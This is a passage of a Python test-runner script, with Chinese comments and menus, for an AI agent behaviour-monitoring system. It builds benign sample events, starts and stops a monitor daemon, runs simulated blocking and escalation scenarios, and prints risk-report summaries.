    from models.event import RawEvent
    base = 1718092800000000000
    return [
        RawEvent(event_id="n01", timestamp_ns=base, event_type="exec",
                 pid=60001, ppid=60000, agent_id=agent_id,
                 agent_framework="recorded",
                 executable="/usr/bin/gcc",
                 arguments=["gcc", "-o", "main", "main.c"]),
        RawEvent(event_id="n02", timestamp_ns=base+100_000_000,
                 event_type="file_open", pid=60001, ppid=60000,
                 agent_id=agent_id, agent_framework="recorded",
                 file_path="/home/dev/project/main.c", file_op="read"),
        RawEvent(event_id="n03", timestamp_ns=base+300_000_000,
                 event_type="exec", pid=60002, ppid=60000,
                 agent_id=agent_id, agent_framework="recorded",
                 executable="/usr/bin/git",
                 arguments=["git", "commit", "-m", "fix bug"]),
        RawEvent(event_id="n04", timestamp_ns=base+400_000_000,
                 event_type="net_conn", pid=60002, ppid=60000,
                 agent_id=agent_id, agent_framework="recorded",
                 remote_addr="140.82.121.4", remote_port=443, protocol="TCP"),
    ]


def _short_event_desc(event) -> str:
    """事件简短描述"""
    et = event.event_type
    if et == "exec":
        exe = event.executable or ""
        args = " ".join(event.arguments or [])
        return f"{exe} {args}".strip()[:60]
    elif et == "file_open":
        return f"{event.file_op or 'open'} {event.file_path or ''}"
    elif et == "net_conn":
        return f"{event.remote_addr or ''}:{event.remote_port or ''}"
    return et


# ── 实时监测 (Demo Monitoring) ───────────────────────────────────────────────
DEMO_MONITOR_SCRIPT = os.path.join(PROJECT_ROOT, "start_demo_monitoring.sh")
MONITORING_OUTPUT_DIR = os.path.join(OBSERVER_DIR, "output", "demo_monitoring")
# 运行时文件全部放在 workspace 内，避免 /tmp 沙箱写入限制与 root 属主冲突
MONITORING_RUN_DIR = os.path.join(PROJECT_ROOT, ".monitoring")
MONITORING_FIFO = os.path.join(MONITORING_RUN_DIR, "pipe")
MONITORING_MONITOR_PID = os.path.join(MONITORING_RUN_DIR, "monitor.pid")
MONITORING_AGENT_PID = os.path.join(MONITORING_RUN_DIR, "agent.pid")
MONITORING_MONITOR_LOG = os.path.join(MONITORING_RUN_DIR, "monitor.log")

# ── Agent 行为模拟测试场景配置 ──────────────────────────────────────────────
AGENT_SIM_SCENARIOS = [
    {
        "key": "1",
        "label": "Tier2 阻断验证",
        "description": "验证违规累计升级到 Tier2，BlockAccessHandler 执行阻断",
        "run_type": "agent_sim",
        "scenario_id": "da05",
        "scenario_path": "observer_sim/scenarios/deep_agent/da05_blocking_tier2_test.yaml",
        "expected": "4 ALERT + 2 BLOCK @ Tier2 + 1 ALLOW",
    },
    {
        "key": "2",
        "label": "Tier3 升级验证",
        "description": "Tier2→Tier3 升级链 + Agent 终止逻辑 (verify_tier3_escalation.py)",
        "run_type": "script",
        "script_path": "observer_sim/tests/verify_tier3_escalation.py",
    },
    {
        "key": "3",
        "label": "生产场景演示",
        "description": "Q3 商业报表市场分析，17 个事件综合演示",
        "run_type": "agent_sim",
        "scenario_id": "da04",
        "scenario_path": "observer_sim/scenarios/deep_agent/da04_production_demo.yaml",
        "expected": "混合 ALLOW/ALERT/BLOCK 全链路演示",
    },
    {
        "key": "4",
        "label": "单元测试 (阻断机制)",
        "description": "运行 test_blocking.py — 16 个阻断相关单元测试",
        "run_type": "pytest",
        "pytest_files": ["test_blocking.py"],
    },
]


def _start_monitoring_only():
    """仅启动 Monitor 守护进程，不启动模拟 Agent"""
    if not os.path.isfile(DEMO_MONITOR_SCRIPT):
        print("  ❌ 启动脚本不存在: start_demo_monitoring.sh")
        return False

    os.makedirs(MONITORING_RUN_DIR, exist_ok=True)

    # 检查是否已在运行
    if os.path.isfile(MONITORING_MONITOR_PID):
        try:
            with open(MONITORING_MONITOR_PID) as f:
                pid = int(f.read().strip())
            os.kill(pid, 0)
            print(f"  ✅ Monitor 已在运行中 (PID: {pid})")
            return True
        except (OSError, ValueError):
            pass

    try:
        proc = subprocess.Popen(
            ["bash", DEMO_MONITOR_SCRIPT, "--monitor-only", "--daemon"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            cwd=PROJECT_ROOT,
        )
        time.sleep(1.5)

        poll_result = proc.poll()
        if poll_result is not None:
            print(f"  ❌ Monitor 启动失败 (exit_code={poll_result})")
            return False

        if os.path.isfile(MONITORING_MONITOR_PID):
            with open(MONITORING_MONITOR_PID) as f:
                pid = f.read().strip()
            print(f"  ✅ Monitor 守护进程已启动 (PID: {pid})")
            print(f"     FIFO:   {MONITORING_FIFO}")
            print(f"     日志:   tail -f {MONITORING_MONITOR_LOG}")
            return True
        else:
            print(f"  ⚠️  Monitor 启动状态异常（无 PID 文件）")
            return False
    except Exception as e:
        print(f"  ❌ Monitor 启动失败: {e}")
        return False


def _start_monitoring():
    """启动实时监测（仅启动 Monitor 守护进程，Agent 需手动启动）"""
    if not os.path.isfile(DEMO_MONITOR_SCRIPT):
        print("  ❌ 启动脚本不存在: start_demo_monitoring.sh")
        return

    # 确保运行时目录存在
    os.makedirs(MONITORING_RUN_DIR, exist_ok=True)

    # 检查是否已在运行
    if os.path.isfile(MONITORING_MONITOR_PID):
        try:
            with open(MONITORING_MONITOR_PID) as f:
                pid = int(f.read().strip())
            os.kill(pid, 0)
            print(f"  ⚠️  Monitor 已在运行中 (PID: {pid})")
            print(f"  如需重启，请先选择「终止监测」")
            return
        except (OSError, ValueError):
            pass

    print(f"\n{'─' * 60}")
    print(f"  🚀 启动实时监测（仅 Monitor 守护进程）")
    print(f"{'─' * 60}")
    print(f"  Monitor: observer_sim 全链路 Pipeline (独立进程)")
    print(f"  通信:    FIFO 命名管道 ({MONITORING_FIFO})")
    print(f"  模式:    daemon (持续等待 Agent 连接)")
    print()

    success = _start_monitoring_only()
    if success:
        print()
        print(f"  📋 在另一个终端启动 Agent:")
        print(f"     # 模拟 Agent:")
        print(f"     python3 observer_sim/agent_sim.py \\")
        print(f"         --scenario observer_sim/scenarios/deep_agent/da04_production_demo.yaml \\")
        print(f"         --fifo {MONITORING_FIFO}")
        print(f"")
        print(f"     # 真实 Agent:")
        print(f"     cd deep-agents-demo && python3 run_agent.py \\")
        print(f"         --task-file task_instruction.txt \\")
        print(f"         --fifo {MONITORING_FIFO}")
        print(f"")
        print(f"  💡 实时查看: tail -f {MONITORING_MONITOR_LOG}")
        print(f"  💡 在 test.py 中选择「终止监测」停止进程并生成报告")


def _stop_monitoring():
    """停止实时监测并生成报告"""
    print(f"\n{'─' * 60}")
    print(f"  🛑 终止监测演示")
    print(f"{'─' * 60}")

    try:
        result = subprocess.run(
            ["bash", DEMO_MONITOR_SCRIPT, "--stop"],
            capture_output=True, text=True,
            cwd=PROJECT_ROOT, timeout=10,
        )
        print(result.stdout)
    except subprocess.TimeoutExpired:
        print("  ⚠️  停止超时，尝试强制终止...")
        _force_stop_monitoring()
    except Exception as e:
        print(f"  ⚠️  停止脚本出错: {e}")

    # 等待报告生成
    time.sleep(1)

    # 检查并显示报告
    _show_monitoring_report()


def _force_stop_monitoring():
    """强制终止监测进程"""
    for name, pid_file in [("agent.pid", MONITORING_AGENT_PID),
                            ("monitor.pid", MONITORING_MONITOR_PID)]:
        if os.path.isfile(pid_file):
            try:
                with open(pid_file) as f:
                    pid = int(f.read().strip())
                os.kill(pid, 15)  # SIGTERM
                print(f"  已终止 {name}: PID {pid}")
            except (OSError, ValueError):
                pass
    # 清理
    if os.path.exists(MONITORING_FIFO):
        os.remove(MONITORING_FIFO)


def _show_monitoring_report():
    """显示最新的监测报告摘要"""
    reports_dir = os.path.join(MONITORING_OUTPUT_DIR, "reports")
    summary_file = os.path.join(MONITORING_OUTPUT_DIR, "monitoring_summary.json")

    if not os.path.isfile(summary_file):
        print(f"\n  ⚠️  未找到监测报告摘要，请检查 Monitor 是否正确生成报告")
        print(f"     预期位置: {summary_file}")
        return

    import json as _json
    try:
        with open(summary_file, "r", encoding="utf-8") as f:
            summary = _json.load(f)
    except Exception as e:
        print(f"  ❌ 读取报告失败: {e}")
        return

    print(f"\n{'─' * 60}")
    print(f"  📊 监测报告摘要")
    print(f"{'─' * 60}")
    print(f"  场景:       {summary.get('scenario', 'N/A')}")
    print(f"  总事件数:   {summary.get('total_events', 0)}")
    print(f"  🟢 放行:    {summary.get('allow', 0)}")
    print(f"  🟡 告警:    {summary.get('alert', 0)}")
    print(f"  🔴 阻断:    {summary.get('block', 0)}")
    print(f"  最高风险分: {summary.get('max_risk_score', 0):.2f}")

    # 风险分布
    risk_dist = summary.get('risk_distribution', {})
    if risk_dist:
        print(f"  风险分布:")
        for level in ["LOW", "MEDIUM", "HIGH", "CRITICAL"]:
            count = risk_dist.get(level, 0)
            bar = "█" * min(count, 20) if count > 0 else ""
            print(f"    {level:8s}: {count:3d} {bar}")

    # 命中规则
    matched = summary.get('matched_rules', [])
    if matched:
        print(f"  命中规则:")
        for rule_id, score in matched[:10]:
            print(f"    - {rule_id} (score={score:.2f})")

    # 报告文件
    report_path = summary.get('report_path', '')
    audit_file = summary.get('audit_file', '')
    if report_path:
        print(f"\n  📄 完整报告: {report_path}")
    if audit_file:
        print(f"  📋 审计日志: {audit_file}")

    generated = summary.get('generated_at', '')
    if generated:
        print(f"  ⏰ 生成时间: {generated}")

    print()


# ── Agent 行为模拟测试子菜单 ─────────────────────────────────────────────────
def _agent_sim_submenu():
    """Agent 行为模拟测试子菜单"""
    while True:
        print()
        print("─" * 60)
        print("  🧪 Agent 行为模拟测试")
        print("─" * 60)
        for sc in AGENT_SIM_SCENARIOS:
            print(f"  [{sc['key']}] {sc['label']}")
            print(f"      {sc['description']}")
        print(f"  [0] 返回主菜单")
        print()

        choice = input("请选择 [0-4]: ").strip()
        if choice == "0":
            break

        sc = next((s for s in AGENT_SIM_SCENARIOS if s["key"] == choice), None)
        if not sc:
            print(f"  ❌ 无效选项: {choice}")
            continue

        run_type = sc["run_type"]
        if run_type == "agent_sim":
            _run_agent_sim_scenario(sc)
        elif run_type == "script":
            _run_script_test(sc)
        elif run_type == "pytest":
            _run_agent_sim_pytest(sc)


def _run_agent_sim_scenario(sc: dict):
    """运行 Agent 模拟测试场景 (Monitor + agent_sim FIFO 通信)"""
    scenario_path = os.path.join(PROJECT_ROOT, sc["scenario_path"])
    if not os.path.isfile(scenario_path):
        print(f"  ❌ 场景文件不存在: {scenario_path}")
        return

    print(f"\n{'─' * 60}")
    print(f"  🧪 {sc['label']}")
    print(f"  📋 {sc['description']}")
    print(f"  📂 场景: {sc['scenario_path']}")
    if sc.get("expected"):
        print(f"  🎯 预期: {sc['expected']}")
    print(f"{'─' * 60}")

    # Step 1: 确保 Monitor 在运行
    mon_status = _check_monitoring_status()
    if not mon_status["monitor"]:
        print(f"\n  🔧 Monitor 未运行，正在启动...")
        if not _start_monitoring_only():
            print(f"  ❌ Monitor 启动失败，无法继续")
            return
    else:
        print(f"\n  ✅ Monitor 已在运行中")

    # Step 2: 运行 agent_sim
    agent_sim_path = os.path.join(OBSERVER_DIR, "agent_sim.py")
    if not os.path.isfile(agent_sim_path):
        print(f"  ❌ agent_sim.py 不存在: {agent_sim_path}")
        return

    print(f"\n  🚀 启动 Agent 模拟器...")
    try:
        result = subprocess.run(
            [sys.executable, agent_sim_path,
             "--scenario", scenario_path,
             "--fifo", MONITORING_FIFO],
            capture_output=True, text=True,
            cwd=PROJECT_ROOT, timeout=120,
        )
        if result.returncode != 0:
            print(f"  ⚠️  Agent 模拟器退出码: {result.returncode}")
            if result.stderr:
                print(f"  stderr: {result.stderr[:500]}")
    except subprocess.TimeoutExpired:
        print(f"  ⚠️  Agent 模拟器超时 (120s)")
    except Exception as e:
        print(f"  ❌ Agent 模拟器运行失败: {e}")
        return

    # Step 3: 等待报告生成
    print(f"\n  ⏳ 等待 Monitor 生成报告...")
    time.sleep(2)
    _show_monitoring_report()


def _run_script_test(sc: dict):
    """运行独立验证脚本"""
    script_path = os.path.join(PROJECT_ROOT, sc["script_path"])
    if not os.path.isfile(script_path):
        print(f"  ❌ 脚本不存在: {script_path}")
        return

    print(f"\n{'─' * 60}")
    print(f"  🧪 {sc['label']}")
    print(f"  📋 {sc['description']}")
    print(f"{'─' * 60}")

    try:
        result = subprocess.run(
            [sys.executable, script_path],
            capture_output=True, text=True,
            cwd=PROJECT_ROOT, timeout=120,
        )
        print(result.stdout)
        if result.stderr:
            print(result.stderr)
        if result.returncode == 0:
            print(f"\n  ✅ {sc['label']} — 全部通过")
        else:
            print(f"\n  ❌ {sc['label']} — 存在失败 (exit_code={result.returncode})")
    except subprocess.TimeoutExpired:
        print(f"  ⚠️  脚本超时 (120s)")
    except Exception as e:
        print(f"  ❌ 脚本运行失败: {e}")


def _run_agent_sim_pytest(sc: dict):
    """运行 pytest 形式的 Agent 模拟测试"""
    print(f"\n{'─' * 60}")
    print(f"  🧪 {sc['label']}")
    print(f"  📋 {sc['description']}")
    print(f"{'─' * 60}")

    env = EnvCapabilities()
    env.detect()
    result = run_pytest(sc.get("pytest_files", []), env)

    if result.error:
        print(f"  ❌ 测试失败: {result.error}")
    else:
        print(f"\n  📊 结果: {result.passed} passed, {result.failed} failed, {result.skipped} skipped")


def _check_monitoring_status() -> dict:
    """检查监测进程运行状态"""
    monitor_running = False
    agent_running = False

    if os.path.isfile(MONITORING_MONITOR_PID):
        try:
            with open(MONITORING_MONITOR_PID) as f:
                pid = int(f.read().strip())
            os.kill(pid, 0)
            monitor_running = True
        except (OSError, ValueError):
            pass

    if os.path.isfile(MONITORING_AGENT_PID):
        try:
            with open(MONITORING_AGENT_PID) as f:
                pid = int(f.read().strip())
            os.kill(pid, 0)
            agent_running = True
        except (OSError, ValueError):
            pass

    return {"monitor": monitor_running, "agent": agent_running}


# ── 交互式菜单 ──────────────────────────────────────────────────────────────
def interactive_menu(env: EnvCapabilities, categories: List[TestCategory]):
    """交互式菜单选择"""
    print()
    print("╔══════════════════════════════════════════════════════════╗")
    print("║   方寸观察者模拟学习系统 — 统一测试入口                  ║")
    print("╠══════════════════════════════════════════════════════════╣")
    print("║                                                          ║")
    print("║  环境能力:                                               ║")
    for line in env.summary():
        print(f"║    {line:<54s} ║")
    print("║                                                          ║")
    print("╠══════════════════════════════════════════════════════════╣")
    print("║                                                          ║")
    print("║  [1] 单元测试        — 核心模块独立验证                   ║")
    print("║  [2] 采集器测试      — simulation/strace/ebpf/replay      ║")
    print("║  [3] 集成测试        — 多模块协作 Pipeline 验证           ║")
    print("║  [4] 场景测试        — 37 个 YAML 场景回放 (simulation)   ║")
    print("║  [5] 端到端测试      — 真实 strace/eBPF (需 root)         ║")
    print("║  [6] Web API 测试    — API + SSE 验证 (需启动 app.py)     ║")
    print("║  [7] 全部运行        — 自动跳过不可用项                   ║")
    print("║  [8] 环境检测        — 仅显示环境能力                     ║")
    print("║  [9] * 开始录制      — 启动事件流录制                     ║")
    rec_status = "active" if (_active_recorder and _active_recorder.is_recording) else ""
    stop_label = f"— {'[' + rec_status + '] 停止录制并保存':<37s} ║" if rec_status else "— 停止录制并保存文件                               ║"
    print(f"║  [A] + 结束录制     {stop_label}")
    print("║  [B] < 回放录制      — 选择历史录制并回放分析             ║")
    print("║                                                          ║")
    print("╠══════════════════════════════════════════════════════════╣")
    print("║  📡 实时监测 (Production Demo)                            ║")
    print("║                                                          ║")
    # 检查监测状态
    mon_status = _check_monitoring_status()
    if mon_status["monitor"]:
        print("║  [D] 启动监测        — 🔵 监测运行中...                   ║")
        print("║  [E] 终止监测        — 停止并生成风险分析报告             ║")
    else:
        print("║  [D] 启动监测        — 仅启动 Monitor 守护进程            ║")
        print("║  [E] 终止监测        — 停止并生成风险分析报告             ║")
    print("║                                                          ║")
    print("║  [F] 全链路验证      — 录制 N 次回放，比较统计一致性      ║")
    print("║  [G] Agent 模拟测试  — Tier2阻断/Tier3升级/生产演示       ║")
    print("║                                                          ║")
    print("╠══════════════════════════════════════════════════════════╣")
    print("║  [0] 退出                                                  ║")
    print("║                                                          ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print()

    choice = input("请选择 [0-9/A/B/D/E/F/G]: ").strip().upper()
    all_names = ["unit", "collector", "integration", "scenario", "e2e", "web"]
    mapping = {
        "1": ["unit"], "2": ["collector"], "3": ["integration"],
        "4": ["scenario"], "5": ["e2e"], "6": ["web"],
        "7": all_names, "8": ["check"],
        "9": ["record"], "A": ["stop_record"], "B": ["replay"],
        "D": ["start_monitor"], "E": ["stop_monitor"],
        "F": ["full_verify"], "G": ["agent_sim"],
    }
    return mapping.get(choice, [])


# ── 主逻辑 ──────────────────────────────────────────────────────────────────
def run_selected(names: List[str], env: EnvCapabilities, categories: List[TestCategory]) -> bool:
    """运行选定的测试分类，返回是否全部通过"""
    results: List[TestResult] = []

    for name in names:
        # 录制-回放特殊处理
        if name == "record":
            _start_recording(env)
            continue
        if name == "stop_record":
            _stop_recording()
            continue
        if name == "replay":
            _replay_recording()
            continue
        if name == "start_monitor":
            _start_monitoring()
            continue
        if name == "stop_monitor":
            _stop_monitoring()
            continue
        if name == "full_verify":
            _full_pipeline_verify()
            continue
        if name == "agent_sim":
            _agent_sim_submenu()
            continue

        cat = next((c for c in categories if c.name == name), None)
        if not cat:
            continue

        print(f"\n{'─' * 60}")
        print(f"  ▶ {cat.label} — {cat.description}")
        print(f"{'─' * 60}")

        # 检查前置条件
        if cat.requires_root and not env.is_root:
            print(f"  ⏭️  跳过: 需要 root 权限")
            results.append(TestResult(category=cat.label, skipped=1, error="需要 root 权限"))
            continue
        if cat.requires_ebpf and not env.has_ebpf:
            print(f"  ⏭️  跳过: 需要 eBPF 支持")
            results.append(TestResult(category=cat.label, skipped=1, error="需要 eBPF 支持"))
            continue
        if cat.requires_web and not env.app_running:
            print(f"  ⏭️  跳过: 需要先启动 app.py")
            results.append(TestResult(category=cat.label, skipped=1, error="app.py 未运行"))
            continue

        # 按运行类型分发
        if cat.run_type == "pytest":
            r = run_pytest(cat.files, env)
            r.category = cat.label
            results.append(r)
        elif cat.run_type == "scenario":
            r = run_scenario_tests(env)
            r.category = cat.label
            results.append(r)
        elif cat.run_type == "script":
            r = run_e2e_tests(env)
            r.category = cat.label
            results.append(r)
        elif cat.run_type == "web_script":
            r = run_web_tests(env)
            r.category = cat.label
            results.append(r)

    return write_report(results)


def list_tests(env: EnvCapabilities, categories: List[TestCategory]):
    """列出所有测试分类及其状态"""
    print(f"\n{'=' * 70}")
    print(f"  测试分类清单")
    print(f"{'=' * 70}")
    for cat in categories:
        available = True
        skip_reason = ""
        if cat.requires_root and not env.is_root:
            available = False
            skip_reason = " (需 root)"
        if cat.requires_web and not env.app_running:
            available = False
            skip_reason = " (需 app.py)"
        if cat.requires_ebpf and not env.has_ebpf:
            available = False
            skip_reason = " (需 eBPF)"

        status = "✅ 可用" if available else f"⏭️  跳过{skip_reason}"
        print(f"\n  [{cat.name:12s}] {cat.label} — {status}")
        print(f"    {cat.description}")

        if cat.run_type == "pytest" and cat.files:
            for f in cat.files:
                exists = os.path.exists(os.path.join(TESTS_DIR, f)) or os.path.exists(os.path.join(OBSERVER_DIR, f))
                mark = "  ✓" if exists else "  ✗"
                print(f"      {mark} {f}")
        elif cat.run_type == "scenario":
            total = sum(len([f for f in os.listdir(os.path.join(SCENARIOS_DIR, d)) if f.endswith(".yaml")])
                        for d in os.listdir(SCENARIOS_DIR) if os.path.isdir(os.path.join(SCENARIOS_DIR, d)))
            print(f"      📋 {total} 个 YAML 场景文件")
        elif cat.run_type == "script":
            print(f"      📜 sudo_test/run_all.sh")

    print(f"\n{'=' * 70}")


def main():
    parser = argparse.ArgumentParser(
        description="方寸观察者模拟学习系统 — 统一测试入口",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  python test.py --unit             # 仅运行单元测试
  python test.py --unit --collector # 运行单元+采集器测试
  python test.py --all              # 运行全部可用测试
  python test.py --scenario         # 运行 37 个场景回放
  python test.py --e2e              # 端到端测试（需 root）
  python test.py --check            # 检测环境能力
  python test.py --list             # 列出所有测试分类
        """)
    parser.add_argument("--all", action="store_true", help="运行全部可用测试")
    parser.add_argument("--unit", action="store_true", help="单元测试")
    parser.add_argument("--collector", action="store_true", help="采集器测试")
    parser.add_argument("--integration", action="store_true", help="集成测试")
    parser.add_argument("--scenario", action="store_true", help="场景测试（simulation 模式）")
    parser.add_argument("--e2e", action="store_true", help="端到端测试（需 root）")
    parser.add_argument("--web", action="store_true", help="Web API 测试")
    parser.add_argument("--check", action="store_true", help="仅检测环境能力")
    parser.add_argument("--list", action="store_true", help="列出所有测试分类")
    parser.add_argument("--filter", default="", help="场景过滤器（如 n01, a02）")
    parser.add_argument("--record", action="store_true",
                        help="开始录制（simulation 模式，自动录制恶意+正常场景）")
    parser.add_argument("--replay", type=str, default=None, metavar="SESSION_ID",
                        help="回放指定录制会话（如 20260731_143025）")

    args = parser.parse_args()

    # 环境检测
    env = EnvCapabilities()
    env.detect()
    categories = get_categories()

    if args.check:
        print("\n  环境能力检测:")
        for line in env.summary():
            print(f"  {line}")
        print()
        return 0

    # 录制-回放 CLI 参数
    if args.record:
        sys.path.insert(0, OBSERVER_DIR)
        from recorder.session_recorder import SessionRecorder
        recorder = SessionRecorder(
            records_dir=RECORDS_DIR,
            agent_id="record-agent",
            collect_mode="simulation",
        )
        recorder.start()
        print(f"\n  Recording session: {recorder.session_id}")
        print(f"  Recording all built-in scenarios (malicious + normal + DeepAgent)...")
        all_events = (
            _builtin_malicious_events("record-agent")
            + _builtin_normal_events("record-agent")
            + _builtin_da01_events("record-agent")
            + _builtin_da02_events("record-agent")
            + _builtin_da03_events("record-agent")
            + _builtin_da04_events("record-agent")
        )
        for evt in all_events:
            recorder.write_event(evt)
            print(f"    [REC] {evt.event_type:10s} | {_short_event_desc(evt)}")
        summary = recorder.stop()
        print(f"\n  Done: {summary['event_count']} events -> {summary['events_file']}")
        return 0

    if args.replay:
        sys.path.insert(0, OBSERVER_DIR)
        from recorder.session_recorder import SessionRecorder
        from recorder.replay_engine import ReplayEngine
        session_dir = os.path.join(RECORDS_DIR, args.replay)
        if not os.path.isdir(session_dir):
            print(f"  ERROR: Session not found: {args.replay}")
            recordings = SessionRecorder.list_recordings(RECORDS_DIR)
            if recordings:
                print(f"  Available sessions:")
                for r in recordings:
                    print(f"    {r['session_id']}  ({r['event_count']} events)")
            return 1
        config_path = os.path.join(OBSERVER_DIR, "config.yaml")
        config = {}
        if os.path.isfile(config_path):
            import yaml
            with open(config_path, "r", encoding="utf-8") as f:
                config = yaml.safe_load(f) or {}
        engine = ReplayEngine(config)
        engine.replay(session_dir)
        return 0

    if args.list:
        list_tests(env, categories)
        return 0

    # 确定要运行的分类
    selected = []
    has_flag = any([args.all, args.unit, args.collector, args.integration,
                    args.scenario, args.e2e, args.web, args.record,
                    args.replay is not None])

    if not has_flag:
        # 交互式菜单（循环，支持录制-回放多步操作）
        while True:
            selected = interactive_menu(env, categories)
            if not selected:
                return 0
            if selected == ["check"]:
                print("\n  环境能力:")
                for line in env.summary():
                    print(f"  {line}")
                print()
                continue
            # 退出选项
            if "exit" in selected:
                return 0
            run_selected(selected, env, categories)
            # 测试完成后返回菜单（录制-回放需要多步操作）
    else:
        if args.all:
            selected = ["unit", "collector", "integration", "scenario", "e2e", "web"]
        else:
            if args.unit:
                selected.append("unit")
            if args.collector:
                selected.append("collector")
            if args.integration:
                selected.append("integration")
            if args.scenario:
                selected.append("scenario")
            if args.e2e:
                selected.append("e2e")
            if args.web:
                selected.append("web")

    ok = run_selected(selected, env, categories)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
